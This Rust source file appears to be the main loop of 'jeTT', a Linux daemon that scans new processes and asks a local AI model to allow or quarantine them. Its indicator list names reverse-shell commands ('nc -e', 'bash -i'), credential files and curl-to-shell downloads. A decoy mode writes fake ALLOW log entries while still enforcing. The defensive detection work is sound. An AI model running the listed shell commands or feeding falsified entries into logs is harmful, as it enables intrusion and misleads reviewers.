use std::collections::HashSet;
use std::fs;
use std::io;
use std::path::Path;
use std::process::Command;
use std::sync::{Arc, Mutex, OnceLock};
use std::thread;
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
use jeTT::enforce::{
    enforce_dry_run, should_quarantine_kill, verdict_label_for_reason,
};
use jeTT::engine::{alert as engine_alert, load_model, new_guard_context, guard as engine_guard, Engine};
use jeTT::pipeline::behavior::{collect_behavior, snapshot_behavior};
use jeTT::telemetry::{
    detect_evasion, daemon_is_trusted, hard_quarantine_reason, honeypot_enabled,
    log_deception_audit, max_event_len, normalize_proc_name, own_stack_fast_allow,
    parse_telemetry_mode, plausible_allow_reason, should_decoy_allow, stat_inode,
    telemetry_mode_label, EventSource, ProcessEvent, TelemetryMode,
};
#[cfg(feature = "ebpf")]
use jeTT::telemetry::{
    ai_queue_size, dedup_window_ms, stat_log_interval_sec, EventCoordinator, TelemetryStats,
};
#[cfg(feature = "ebpf")]
use jeTT::ebpf::spawn_ebpf_sensor;

// ─────────────────────────────────────────────
// jeTT Daemon — Real System Event Monitor
// Watches /proc, auditd, and system logs
// Feeds events to jeTT AI engine for verdicts
// ─────────────────────────────────────────────

const LOG_DIR: &str = "/var/log/jett";
const QUARANTINE_DIR: &str = "/var/jett/quarantine";
const VERSION: &str = "1.0.0";
const DEFAULT_BRAND_MODEL: &str = "IBM Granite 3.3 2B";
const DEFAULT_BRAND_HARDWARE: &str = "RTX 3060";
const BANNER_CONTENT_WIDTH: usize = 39;
const LOG_WRITE_LIMIT_PER_SECOND: u32 = 100;

// Suspicious indicators — immediate flag for AI analysis
const SUSPICIOUS_LITERALS: &[&str] = &[
    "/tmp/.",
    "/tmp/",
    "/dev/shm/",
    "/var/tmp/",
    "/.cache/",
    "/Downloads/",
    "memfd_create",
    "/proc/self/mem",
    "ld_preload",
    "LD_PRELOAD",
    "/etc/shadow",
    "/etc/passwd",
    "chmod +x /tmp",
    "chmod +x /dev/shm",
    "nc -e",
    "ncat -e",
    "bash -i",
    "/bin/sh -i",
    "insmod /tmp",
    "curl",
    "wget",
    "base64 -d",
    "/.ssh/authorized_keys",
];

#[derive(Debug)]
struct JettVerdict {
    event: ProcessEvent,
    verdict: String,
    reason: String,
    elapsed_ms: u64,
    /// Public log/console shows decoy ALLOW; real verdict still enforced.
    honey_decoy: bool,
}

#[derive(Debug)]
enum ProcReadError {
    Read {
        pid: u32,
        field: &'static str,
        source: io::Error,
    },
    MissingField {
        pid: u32,
        field: &'static str,
    },
    InvalidUid {
        pid: u32,
        raw: String,
    },
}

impl std::fmt::Display for ProcReadError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ProcReadError::Read { pid, field, source } => {
                write!(f, "failed to read /proc/{pid}/{field}: {source}")
            }
            ProcReadError::MissingField { pid, field } => {
                write!(f, "missing required /proc field {field} for PID {pid}")
            }
            ProcReadError::InvalidUid { pid, raw } => {
                write!(f, "invalid UID '{raw}' for PID {pid}")
            }
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
enum ProcessDisposition {
    Suspicious,
    Trusted,
    Unknown,
}

#[derive(Debug)]
struct LogRateLimiter {
    window_start: Instant,
    writes_in_window: u32,
    dropped_in_window: u32,
}

impl LogRateLimiter {
    fn new() -> Self {
        Self {
            window_start: Instant::now(),
            writes_in_window: 0,
            dropped_in_window: 0,
        }
    }

    fn claim_slot(&mut self) -> Option<u32> {
        if self.window_start.elapsed() >= Duration::from_secs(1) {
            let dropped = self.dropped_in_window;
            self.window_start = Instant::now();
            self.writes_in_window = 1;
            self.dropped_in_window = 0;
            return Some(dropped);
        }

        if self.writes_in_window < LOG_WRITE_LIMIT_PER_SECOND {
            self.writes_in_window += 1;
            Some(0)
        } else {
            self.dropped_in_window += 1;
            None
        }
    }
}

static LOG_RATE_LIMITER: OnceLock<Mutex<LogRateLimiter>> = OnceLock::new();

fn get_timestamp() -> u64 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs()
}

fn get_env_or_default(key: &str, default: &str) -> String {
    std::env::var(key)
        .ok()
        .filter(|value| !value.trim().is_empty())
        .unwrap_or_else(|| default.to_string())
}

fn print_banner_line(content: &str) {
    let mut rendered = content.to_string();
    if rendered.chars().count() > BANNER_CONTENT_WIDTH {
        rendered = rendered.chars().take(BANNER_CONTENT_WIDTH).collect();
    }
    println!("║ {:<39} ║", rendered);
}

fn read_proc_info(pid: u32) -> Result<ProcessEvent, ProcReadError> {
    let proc_path = format!("/proc/{}", pid);

    let name = normalize_proc_name(
        &fs::read_to_string(format!("{}/comm", proc_path))
            .map_err(|source| ProcReadError::Read {
                pid,
                field: "comm",
                source,
            })?
            .trim(),
    );

    if name.is_empty() {
        return Err(ProcReadError::MissingField { pid, field: "comm" });
    }

    let cmdline = fs::read(format!("{}/cmdline", proc_path))
        .map_err(|source| ProcReadError::Read {
            pid,
            field: "cmdline",
            source,
        })?
        .iter()
        .map(|&b| if b == 0 { b' ' } else { b })
        .collect::<Vec<u8>>();
    let cmdline = String::from_utf8_lossy(&cmdline).trim().to_string();

    let exe_path = fs::read_link(format!("{}/exe", proc_path))
        .map_err(|source| ProcReadError::Read {
            pid,
            field: "exe",
            source,
        })?
        .to_string_lossy()
        .to_string();

    let status = fs::read_to_string(format!("{}/status", proc_path)).map_err(|source| {
        ProcReadError::Read {
            pid,
            field: "status",
            source,
        }
    })?;
    let uid_raw = status
        .lines()
        .find(|line| line.starts_with("Uid:"))
        .ok_or(ProcReadError::MissingField {
            pid,
            field: "status:Uid",
        })?
        .split_whitespace()
        .nth(1)
        .ok_or(ProcReadError::MissingField {
            pid,
            field: "status:Uid",
        })?
        .to_string();
    let uid = uid_raw
        .parse()
        .map_err(|_| ProcReadError::InvalidUid { pid, raw: uid_raw })?;

    let inode = stat_inode(&exe_path);

    Ok(ProcessEvent {
        pid,
        name,
        cmdline,
        exe_path,
        uid,
        timestamp: get_timestamp(),
        source: EventSource::Proc,
        inode,
    })
}

fn classify_event(event: &ProcessEvent) -> ProcessDisposition {
    if is_suspicious(event) {
        ProcessDisposition::Suspicious
    } else if is_trusted(event) {
        ProcessDisposition::Trusted
    } else {
                // Unknown binaries (neither trusted nor matching suspicious patterns)
        // now escalate to the AI model rather than running unjudged.
        // The hash-allowlist + trusted-path checks in guard() short-circuit
        // the common cases, so only genuinely-unknown binaries hit inference.
        ProcessDisposition::Suspicious
    }
}

fn is_trusted(event: &ProcessEvent) -> bool {
    daemon_is_trusted(event)
}

fn contains_pipe_to_shell(command: &str, downloader: &str) -> bool {
    command.contains(downloader)
        && command.contains('|')
        && ["| sh", "|sh", "| /bin/sh", "| bash", "|bash", "| /bin/bash"]
            .iter()
            .any(|pattern| command.contains(pattern))
}

fn is_suspicious(event: &ProcessEvent) -> bool {
    let combined = format!("{} {} {}", event.name, event.cmdline, event.exe_path).to_lowercase();

    for indicator in SUSPICIOUS_LITERALS {
        if combined.contains(indicator) {
            return true;
        }
    }

    if contains_pipe_to_shell(&combined, "curl") || contains_pipe_to_shell(&combined, "wget") {
        return true;
    }

    if (combined.contains("netcat") && combined.contains("-e"))
        || (combined.contains("python") && combined.contains("socket") && combined.contains("exec"))
        || (combined.contains("base64") && combined.contains("decode") && combined.contains("exec"))
    {
        return true;
    }

    if event.exe_path.starts_with("/tmp") || event.exe_path.starts_with("/dev/shm") {
        return true;
    }

    if event.exe_path.contains("/.") {
        return true;
    }

    let probe = format!("{} {} {}", event.name, event.cmdline, event.exe_path);
    if detect_evasion(&probe).is_adversarial() {
        return true;
    }

    false
}

fn env_flag(name: &str, default_on: bool) -> bool {
    std::env::var(name)
        .map(|v| matches!(v.to_lowercase().as_str(), "1" | "true" | "yes"))
        .unwrap_or(default_on)
}

fn capture_forensics(event: &ProcessEvent, event_str: &str, verdict: &str) {
    if !env_flag("JETT_FORENSICS", true) {
        return;
    }
    let dir = format!("{}/forensics", LOG_DIR);
    if fs::create_dir_all(&dir).is_err() {
        return;
    }
    let path = format!(
        "{}/{}_{}_{}.json",
        dir,
        event.pid,
        event.timestamp,
        event.name.replace('/', "_")
    );
    let esc = |s: &str| s.replace('\\', "\\\\").replace('"', "\\\"");
    let source = match event.source {
        EventSource::Proc => "proc",
        EventSource::Ebpf => "ebpf",
    };
    let payload = format!(
        "{{\"pid\":{},\"uid\":{},\"name\":\"{}\",\"exe\":\"{}\",\"cmdline\":\"{}\",\"source\":\"{}\",\"event_str\":\"{}\",\"verdict\":\"{}\",\"ts\":{}}}",
        event.pid,
        event.uid,
        esc(&event.name),
        esc(&event.exe_path),
        esc(&event.cmdline),
        source,
        esc(event_str),
        esc(verdict),
        event.timestamp
    );
    let _ = fs::write(path, payload);
}

fn format_event_for_ai(event: &ProcessEvent) -> String {
    let cmd_cap = std::cmp::min(512, max_event_len());
    format!(
        "{} PID:{} uid:{} exe:{} cmd:{} time:{}",
        event.name,
        event.pid,
        event.uid,
        event.exe_path,
        &event.cmdline.chars().take(cmd_cap).collect::<String>(),
        event.timestamp
    )
}

fn validate_guard_output(
    status_success: bool,
    stdout: &[u8],
    stderr: &[u8],
) -> Result<String, String> {
    let stdout_text = String::from_utf8_lossy(stdout).trim().to_string();
    let stderr_text = String::from_utf8_lossy(stderr).trim().to_string();

    if !stderr_text.is_empty() {
        eprintln!("[!] jett --guard stderr: {}", stderr_text);
    }

    if !status_success {
        return Err(if stderr_text.is_empty() {
            "jett --guard exited unsuccessfully without stderr".to_string()
        } else {
            format!("jett --guard failed: {}", stderr_text)
        });
    }

    if stdout_text.is_empty() {
        return Err(if stderr_text.is_empty() {
            "jett --guard returned empty stdout".to_string()
        } else {
            format!("jett --guard returned empty stdout: {}", stderr_text)
        });
    }

    Ok(stdout_text)
}

fn run_guard_subprocess(event_str: &str) -> Result<String, String> {
    let output = Command::new(get_env_or_default("JETT_BIN", "jett"))
        .arg("--guard")
        .arg(event_str)
        .output()
        .map_err(|error| format!("failed to run jett --guard: {}", error))?;

    validate_guard_output(output.status.success(), &output.stdout, &output.stderr)
}

fn claim_log_slot() -> Option<u32> {
    let limiter = LOG_RATE_LIMITER.get_or_init(|| Mutex::new(LogRateLimiter::new()));
    limiter
        .lock()
        .unwrap_or_else(|error| error.into_inner())
        .claim_slot()
}

fn append_log_line(path: &str, line: &str) {
    if let Ok(mut file) = fs::OpenOptions::new().create(true).append(true).open(path) {
        use std::io::Write;
        if let Err(error) = file.write_all(line.as_bytes()) {
            eprintln!("[!] Failed writing {}: {}", path, error);
        }
    } else {
        eprintln!("[!] Failed opening log file {}", path);
    }
}

fn quarantine_process(event: &ProcessEvent) {
    if enforce_dry_run() {
        println!(
            "[*] ENFORCE DRY-RUN — would quarantine PID {} ({}) — no kill",
            event.pid, event.name
        );
        return;
    }

    let pid = event.pid.to_string();
    match Command::new("kill").args(["-9", &pid]).status() {
        Ok(status) if status.success() => {
            println!("[*] Killed quarantined PID {}", event.pid);
        }
        Ok(status) => {
            eprintln!(
                "[!] kill -9 {} exited with status {:?}",
                event.pid,
                status.code()
            );
        }
        Err(error) => {
            eprintln!("[!] Failed to kill PID {}: {}", event.pid, error);
        }
    }

    if let Err(error) = fs::create_dir_all(QUARANTINE_DIR) {
        eprintln!(
            "[!] Could not create quarantine directory {}: {}",
            QUARANTINE_DIR, error
        );
        return;
    }

    let source = Path::new(&event.exe_path);
    let Some(file_name) = source.file_name().and_then(|value| value.to_str()) else {
        eprintln!(
            "[!] Could not determine quarantine filename for PID {} at {}",
            event.pid, event.exe_path
        );
        return;
    };
    let destination = Path::new(QUARANTINE_DIR).join(format!("{}-{}", event.pid, file_name));

    match fs::copy(source, &destination) {
        Ok(_) => {
            if let Err(error) = fs::remove_file(source) {
                eprintln!(
                    "[!] Failed to remove quarantined executable {} after copying to {}: {}",
                    event.exe_path,
                    destination.display(),
                    error
                );
            }
        }
        Err(error) => {
            eprintln!(
                "[!] Failed to copy {} to {}: {}",
                event.exe_path,
                destination.display(),
                error
            );
        }
    }
}

fn log_verdict(verdict: &JettVerdict) {
    let Some(dropped_logs) = claim_log_slot() else {
        return;
    };

    if dropped_logs > 0 {
        let dropped_line = format!(
            "[{}] jeTT log rate limiter dropped {} entries in the previous second\n",
            get_timestamp(),
            dropped_logs
        );
        println!("{}", dropped_line.trim());
        append_log_line(&format!("{}/jett.log", LOG_DIR), &dropped_line);
    }

    let log_line = if verdict.honey_decoy {
        let reason = plausible_allow_reason(&format!(
            "{} exe:{} cmd:{}",
            verdict.event.name, verdict.event.exe_path, verdict.event.cmdline
        ));
        format!(
            "[{}] {} PID:{} → ✅ ALLOW ({}) {}ms\n",
            verdict.event.timestamp,
            verdict.event.name,
            verdict.event.pid,
            reason,
            verdict.elapsed_ms,
        )
    } else {
        format!(
            "[{}] {} PID:{} → {} ({}) {}ms\n",
            verdict.event.timestamp,
            verdict.event.name,
            verdict.event.pid,
            verdict.verdict,
            verdict.reason.chars().take(80).collect::<String>(),
            verdict.elapsed_ms,
        )
    };

    println!("{}", log_line.trim());
    append_log_line(&format!("{}/jett.log", LOG_DIR), &log_line);

    if verdict.verdict.contains("QUARANTINE") {
        let entry = format!(
            "[{}] PID:{} NAME:{} EXE:{} CMD:{} REASON:{}\n",
            verdict.event.timestamp,
            verdict.event.pid,
            verdict.event.name,
            verdict.event.exe_path,
            verdict.event.cmdline.chars().take(200).collect::<String>(),
            verdict.reason.chars().take(200).collect::<String>(),
        );
        append_log_line(&format!("{}/quarantine.log", QUARANTINE_DIR), &entry);

        let _ = Command::new("notify-send")
            .args(&[
                "--urgency=critical",
                "--icon=security-high",
                "🚨 jeTT QUARANTINE",
                &format!(
                    "PID:{} {} - {}",
                    verdict.event.pid,
                    verdict.event.name,
                    verdict.reason.chars().take(60).collect::<String>()
                ),
            ])
            .spawn();
    }
}

fn scan_new_processes(seen_pids: &Arc<Mutex<HashSet<u32>>>) -> Vec<ProcessEvent> {
    let mut new_events = Vec::new();

    let Ok(entries) = fs::read_dir("/proc") else {
        return new_events;
    };

    for entry in entries.flatten() {
        let Ok(pid) = entry.file_name().to_string_lossy().parse::<u32>() else {
            continue;
        };

        let mut seen = seen_pids.lock().unwrap_or_else(|error| error.into_inner());
        if seen.contains(&pid) {
            continue;
        }
        seen.insert(pid);
        drop(seen);

        match read_proc_info(pid) {
            Ok(event) => new_events.push(event),
            // Silently skip processes we can't read — short-lived (NotFound)
            // or root-owned (PermissionDenied). Neither is actionable noise.
            Err(ProcReadError::Read { source, .. })
                if source.kind() == io::ErrorKind::NotFound
                    || source.kind() == io::ErrorKind::PermissionDenied =>
            {
            }
            Err(error) => eprintln!("[!] {}", error),
        }
    }

    new_events
}

fn cleanup_dead_pids(seen_pids: &Arc<Mutex<HashSet<u32>>>) {
    let mut seen = seen_pids.lock().unwrap_or_else(|error| error.into_inner());
    seen.retain(|&pid| Path::new(&format!("/proc/{}", pid)).exists());
}

fn behavior_mode_label() -> &'static str {
    match std::env::var("JETT_BEHAVIOR_MODE") {
        Ok(m) if m.eq_ignore_ascii_case("poll") => "poll",
        _ => "snapshot",
    }
}

fn skip_event(event: &ProcessEvent) -> bool {
    event.exe_path.is_empty() || event.exe_path.contains("(deleted)")
}

fn profile_for_event(event: &ProcessEvent) -> String {
    match event.source {
        EventSource::Ebpf => {
            let (profile, exited) = snapshot_behavior(event.pid);
            if exited {
                eprintln!(
                    "[*] behavior:exited_before_snapshot pid={} path={}",
                    event.pid, event.exe_path
                );
            }
            profile
        }
        EventSource::Proc => collect_behavior(event.pid),
    }
}

fn finalize_ai_verdict(
    event: ProcessEvent,
    event_str: &str,
    reason: String,
    enforce_mode: bool,
    engine: &Engine,
    started: Instant,
) -> JettVerdict {
    let evasion = detect_evasion(event_str);
    let decoy = honeypot_enabled() && evasion.is_adversarial() && should_decoy_allow(&evasion);

    if reason.starts_with("ERROR:") {
        eprintln!(
            "⚠️ [AI VERDICT: REVIEW] inference failed for {} — {}",
            event.name, reason
        );
        return JettVerdict {
            verdict: verdict_label_for_reason(&reason, enforce_mode),
            reason,
            elapsed_ms: started.elapsed().as_millis() as u64,
            event,
            honey_decoy: false,
        };
    }

    let model_says_quarantine = reason.to_uppercase().contains("QUARANTINE");
    if model_says_quarantine {
        capture_forensics(&event, event_str, &reason);
        if enforce_mode && env_flag("JETT_ALERT_ON_QUARANTINE", true) {
            let _ = engine_alert(&engine.model, &engine.backend, event_str);
        } else if !enforce_mode {
            eprintln!("[*] learn mode: skipping alert subprocess");
        }
    }
    let verdict_label = verdict_label_for_reason(&reason, enforce_mode);

    if decoy {
        let reason_text = plausible_allow_reason(event_str);
        println!(
            "✅ [AI VERDICT: ALLOW] {} cleared by model ({})",
            event.name, reason_text
        );
        log_deception_audit(
            event_str,
            &format!("{} ({})", verdict_label, reason),
            &evasion,
        );
    } else {
        match verdict_label.as_str() {
            "🚨 QUARANTINE" => {
                if should_quarantine_kill(enforce_mode) {
                    println!(
                        "🚨 [AI VERDICT: QUARANTINE] killing PID {} ({})",
                        event.pid, event.name
                    );
                    quarantine_process(&event);
                } else {
                    println!(
                        "🚨 [AI VERDICT: QUARANTINE] dry-run PID {} ({}) — not killing",
                        event.pid, event.name
                    );
                }
            }
            "🟡 WOULD-QUARANTINE" => {
                println!(
                    "🟡 [LEARN MODE] WOULD quarantine PID {} ({}) — not killing",
                    event.pid, event.name
                );
            }
            "✅ ALLOW" => {
                println!("✅ [AI VERDICT: ALLOW] {} cleared by model", event.name);
            }
            _ => {}
        }
    }

    // Real enforcement even when public face is decoy ALLOW.
    if decoy && verdict_label.contains("QUARANTINE") && enforce_mode {
        if should_quarantine_kill(enforce_mode) {
            quarantine_process(&event);
        } else {
            println!(
                "[*] ENFORCE DRY-RUN — decoy path would quarantine PID {} — no kill",
                event.pid
            );
        }
    }

    JettVerdict {
        verdict: verdict_label,
        reason,
        elapsed_ms: started.elapsed().as_millis() as u64,
        event,
        honey_decoy: decoy,
    }
}

fn handle_suspicious_inline(
    event: ProcessEvent,
    enforce_mode: bool,
    guard_ctx: &mut llama_cpp_2::context::LlamaContext<'_>,
    engine: &Engine,
) {
    let t = Instant::now();
    println!(
        "🚨 [SUSPICIOUS DETECTED] {} ({}) — profiling behavior...",
        event.name,
        event.source_label()
    );
    let behavior = profile_for_event(&event);
    let event_str = format!("{}{}", format_event_for_ai(&event), behavior);

    if let Some(rule) = hard_quarantine_reason(&event_str) {
        let reason = format!("🚨 QUARANTINE | hard rule: {}", rule);
        let verdict = finalize_ai_verdict(event, &event_str, reason, enforce_mode, engine, t);
        log_verdict(&verdict);
        return;
    }

    if own_stack_fast_allow(&event_str) {
        let verdict = JettVerdict {
            verdict: "✅ ALLOW".to_string(),
            reason: "own-stack (hard allow)".to_string(),
            elapsed_ms: t.elapsed().as_millis() as u64,
            event,
            honey_decoy: false,
        };
        log_verdict(&verdict);
        return;
    }

    println!("🔬 [BEHAVIOR]{}", behavior);
    println!("🧠 [SENDING TO AI] {}", event.name);

    let reason = match engine_guard(guard_ctx, &engine.model, &event_str) {
        Ok(output) => output,
        Err(error) => {
            eprintln!("[!] guard inference failed: {}", error);
            format!("ERROR: {}", error)
        }
    };

    let verdict = finalize_ai_verdict(event, &event_str, reason, enforce_mode, engine, t);
    log_verdict(&verdict);
}

#[cfg(feature = "ebpf")]
fn dispatch_telemetry_event(
    event: ProcessEvent,
    coordinator: &mut EventCoordinator,
    stats: &TelemetryStats,
    ai_tx: &crossbeam_channel::Sender<ProcessEvent>,
) {
    if skip_event(&event) {
        return;
    }
    if !coordinator.accept(&event) {
        stats.dedup.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        return;
    }

    let t = Instant::now();
    match classify_event(&event) {
        ProcessDisposition::Trusted => {
            stats
                .classify_drop
                .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            let verdict = JettVerdict {
                verdict: "✅ ALLOW".to_string(),
                reason: "Trusted GowskiNet process".to_string(),
                elapsed_ms: t.elapsed().as_millis() as u64,
                event,
                honey_decoy: false,
            };
            if verdict.event.uid == 1000 {
                log_verdict(&verdict);
            }
        }
        ProcessDisposition::Suspicious => {
            match ai_tx.try_send(event) {
                Ok(()) => {
                    stats
                        .ai_queued
                        .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                }
                Err(crossbeam_channel::TrySendError::Full(_)) => {
                    stats
                        .ai_dropped
                        .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
                    eprintln!("[!] AI queue full — dropped suspicious event");
                }
                Err(crossbeam_channel::TrySendError::Disconnected(_)) => {
                    eprintln!("[!] AI queue disconnected");
                }
            }
        }
        ProcessDisposition::Unknown => {
            let verdict = JettVerdict {
                verdict: "⚠️  REVIEW".to_string(),
                reason: format!("Unknown process: {}", event.exe_path),
                elapsed_ms: t.elapsed().as_millis() as u64,
                event,
                honey_decoy: false,
            };
            log_verdict(&verdict);
        }
    }
}

#[cfg(feature = "ebpf")]
fn run_inference_worker(
    ai_rx: crossbeam_channel::Receiver<ProcessEvent>,
    engine: Engine,
    enforce_mode: bool,
    stats: std::sync::Arc<TelemetryStats>,
) {
    let mut guard_ctx = match new_guard_context(&engine) {
        Ok(ctx) => ctx,
        Err(err) => {
            eprintln!("[!] inference thread: guard context failed: {}", err);
            return;
        }
    };

    while let Ok(event) = ai_rx.recv() {
        let t = Instant::now();
        println!(
            "🚨 [SUSPICIOUS DETECTED] {} ({}) — profiling behavior...",
            event.name,
            event.source_label()
        );
        let behavior = profile_for_event(&event);
        let event_str = format!("{}{}", format_event_for_ai(&event), behavior);
        println!("🔬 [BEHAVIOR]{}", behavior);
        println!("🧠 [SENDING TO AI] {}", event.name);

        let reason = match engine_guard(&mut guard_ctx, &engine.model, &event_str) {
            Ok(output) => output,
            Err(error) => {
                eprintln!("[!] guard inference failed: {}", error);
                format!("ERROR: {}", error)
            }
        };

        stats
            .ai_verdicts
            .fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let verdict =
            finalize_ai_verdict(event, &event_str, reason, enforce_mode, &engine, t);
        log_verdict(&verdict);
    }
}

#[cfg(feature = "ebpf")]
fn run_multisource_daemon(
    engine: Engine,
    telemetry: TelemetryMode,
    enforce_mode: bool,
    seen_pids: Arc<Mutex<HashSet<u32>>>,
) {
    use crossbeam_channel;
    use std::sync::Arc;

    let (event_tx, event_rx) = crossbeam_channel::unbounded::<ProcessEvent>();
    let (ai_tx, ai_rx) = crossbeam_channel::bounded::<ProcessEvent>(ai_queue_size());
    let stats = TelemetryStats::new();
    let mut coordinator = EventCoordinator::new(dedup_window_ms());

    let mut ebpf_active = false;
    if matches!(telemetry, TelemetryMode::Ebpf | TelemetryMode::Both) {
        match spawn_ebpf_sensor(event_tx.clone(), Arc::clone(&stats)) {
            Ok(_handle) => {
                ebpf_active = true;
                println!(
                    "[*] JETT_TELEMETRY={} — eBPF ringbuf active",
                    telemetry_mode_label(telemetry)
                );
            }
            Err(err) => {
                eprintln!("[!] eBPF load failed: {}", err);
                if matches!(telemetry, TelemetryMode::Ebpf) {
                    eprintln!("[*] falling back to /proc-only telemetry");
                }
            }
        }
    }

    let use_proc = matches!(telemetry, TelemetryMode::Proc | TelemetryMode::Both)
        || (!ebpf_active && matches!(telemetry, TelemetryMode::Ebpf));

    if use_proc {
        println!("[*] /proc scanner active");
    }

    let stats_worker = Arc::clone(&stats);
    let _inference = thread::Builder::new()
        .name("jett-inference".into())
        .spawn(move || run_inference_worker(ai_rx, engine, enforce_mode, stats_worker))
        .expect("spawn inference thread");

    println!("[✅] jeTT daemon started — telemetry pipeline active");
    println!("[*] AI queue size: {}", ai_queue_size());
    println!("[*] Logs: {}", LOG_DIR);
    println!("[*] Quarantine: {}", QUARANTINE_DIR);
    println!("[*] Press Ctrl+C to stop\n");

    println!("[*] Initial process scan...");
    let initial_events = scan_new_processes(&seen_pids);
    println!(
        "[*] Found {} existing processes — these will be skipped",
        initial_events.len()
    );
    println!("[*] Now monitoring for NEW processes...\n");

    let mut loop_count = 0u64;
    let mut last_stats = Instant::now();
    let stat_interval = Duration::from_secs(stat_log_interval_sec());

    loop {
        if use_proc {
            for event in scan_new_processes(&seen_pids) {
                let _ = event_tx.send(event);
            }
        }

        while let Ok(event) = event_rx.try_recv() {
            dispatch_telemetry_event(event, &mut coordinator, &stats, &ai_tx);
        }

        loop_count += 1;
        if loop_count % 60 == 0 {
            cleanup_dead_pids(&seen_pids);
        }

        if last_stats.elapsed() >= stat_interval {
            println!("{}", stats.log_line());
            last_stats = Instant::now();
        }

        thread::sleep(Duration::from_millis(100));
    }
}

fn main() {
    println!("╔═══════════════════════════════════════════╗");
    print_banner_line(&format!("jeTT Daemon v{}", VERSION));
    print_banner_line("GowskiNet AI Security Monitor");
    print_banner_line(&format!(
        "{} — {}",
        get_env_or_default("JETT_BRAND_MODEL", DEFAULT_BRAND_MODEL),
        get_env_or_default("JETT_BRAND_HARDWARE", DEFAULT_BRAND_HARDWARE),
    ));
    println!("╚═══════════════════════════════════════════╝");
    println!();

    for dir in &[LOG_DIR, QUARANTINE_DIR] {
        if let Err(e) = fs::create_dir_all(dir) {
            eprintln!(
                "[!] Could not create {}: {} (try: sudo mkdir -p {})",
                dir, e, dir
            );
        }
    }

    println!("[*] Loading jeTT AI model...");
    let model_path =
        std::env::var("JETT_MODEL").unwrap_or_else(|_| "/opt/jett/models/jeTT-q4.gguf".to_string());
    println!("[*] Model: {}", model_path);

    if !Path::new(&model_path).exists() {
        eprintln!("[!] Model not found: {}", model_path);
        std::process::exit(1);
    }
    let engine: Engine = match load_model(&model_path) {
        Ok(e) => {
            println!("[OK] Model loaded into VRAM - warm and ready (no per-event reload)");
            e
        }
        Err(err) => {
            eprintln!("[!] Failed to load model: {}", err);
            std::process::exit(1);
        }
    };
    let behavior_mode = behavior_mode_label();
    let telemetry = parse_telemetry_mode();
    #[cfg(feature = "ebpf")]
    let use_pipeline =
        matches!(telemetry, TelemetryMode::Ebpf | TelemetryMode::Both);
    #[cfg(not(feature = "ebpf"))]
    {
        if matches!(telemetry, TelemetryMode::Ebpf | TelemetryMode::Both) {
            println!(
                "[*] JETT_TELEMETRY={} — rebuild with --features ebpf; using /proc",
                telemetry_mode_label(telemetry)
            );
        } else {
            println!("[*] JETT_TELEMETRY=proc");
        }
    }
    #[cfg(feature = "ebpf")]
    if !use_pipeline {
        println!("[*] JETT_TELEMETRY=proc");
    }
    println!(
        "[*] Guard context: n_ctx={} behavior={}",
        std::env::var("JETT_N_CTX").unwrap_or_else(|_| "512".into()),
        behavior_mode
    );

    // Safety mode: "learn" (default) logs would-kills WITHOUT killing.
    // "enforce" actually kills. Default is learn — you opt INTO enforcement.
    let enforce_mode = std::env::var("JETT_MODE")
        .map(|m| m.eq_ignore_ascii_case("enforce"))
        .unwrap_or(false);
    if enforce_mode {
        if enforce_dry_run() {
            println!("[\u{26a0}] ENFORCE MODE (DRY-RUN) — logs QUARANTINE but does NOT kill");
        } else {
            println!("[\u{26a0}] ENFORCE MODE — jeTT WILL kill quarantined processes");
        }
    } else {
        println!("[\u{1f6e1}] LEARN MODE — jeTT logs would-kills but does NOT kill (set JETT_MODE=enforce to enable killing)");
    }
    println!("[*] Press Ctrl+C to stop\n");

    let seen_pids: Arc<Mutex<HashSet<u32>>> = Arc::new(Mutex::new(HashSet::new()));

    #[cfg(feature = "ebpf")]
    if use_pipeline {
        return run_multisource_daemon(engine, telemetry, enforce_mode, seen_pids);
    }

    let mut guard_ctx = match new_guard_context(&engine) {
        Ok(ctx) => ctx,
        Err(err) => {
            eprintln!("[!] Failed to create guard context: {}", err);
            std::process::exit(1);
        }
    };

    println!("[✅] jeTT daemon started — watching /proc for new processes");
    println!("[*] Logs: {}", LOG_DIR);
    println!("[*] Quarantine: {}", QUARANTINE_DIR);
    println!("[*] Press Ctrl+C to stop\n");

    let seen_pids = seen_pids;

    println!("[*] Initial process scan...");
    let initial_events = scan_new_processes(&seen_pids);
    println!(
        "[*] Found {} existing processes — these will be skipped",
        initial_events.len()
    );
    println!("[*] Now monitoring for NEW processes...\n");

    let mut loop_count = 0u64;

    loop {
        let new_events = scan_new_processes(&seen_pids);

        for event in new_events {
            if skip_event(&event) {
                continue;
            }

            let t = Instant::now();

            match classify_event(&event) {
                ProcessDisposition::Trusted => {
                    let verdict = JettVerdict {
                        verdict: "✅ ALLOW".to_string(),
                        reason: "Trusted GowskiNet process".to_string(),
                        elapsed_ms: t.elapsed().as_millis() as u64,
                        event,
                        honey_decoy: false,
                    };
                    if verdict.event.uid == 1000 {
                        log_verdict(&verdict);
                    }
                }
                ProcessDisposition::Suspicious => {
                    handle_suspicious_inline(event, enforce_mode, &mut guard_ctx, &engine);
                }
                ProcessDisposition::Unknown => {
                    let verdict = JettVerdict {
                        verdict: "⚠️  REVIEW".to_string(),
                        reason: format!("Unknown process: {}", event.exe_path),
                        elapsed_ms: t.elapsed().as_millis() as u64,
                        event,
                        honey_decoy: false,
                    };
                    log_verdict(&verdict);
                }
            }
        }

        loop_count += 1;
        if loop_count % 60 == 0 {
            cleanup_dead_pids(&seen_pids);
        }

        thread::sleep(Duration::from_millis(100));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn event(name: &str, cmdline: &str, exe_path: &str) -> ProcessEvent {
        ProcessEvent {
            pid: 42,
            name: name.to_string(),
            cmdline: cmdline.to_string(),
            exe_path: exe_path.to_string(),
            uid: 1000,
            timestamp: 1,
            source: EventSource::Proc,
            inode: None,
        }
    }

    #[test]
    fn suspicious_execution_beats_trusted_interpreter_name() {
        let event = event("python3", "python3 /tmp/dropper.py", "/tmp/dropper.py");

        assert_eq!(classify_event(&event), ProcessDisposition::Suspicious);
    }

    #[test]
    fn plain_bash_is_suspicious_not_trusted() {
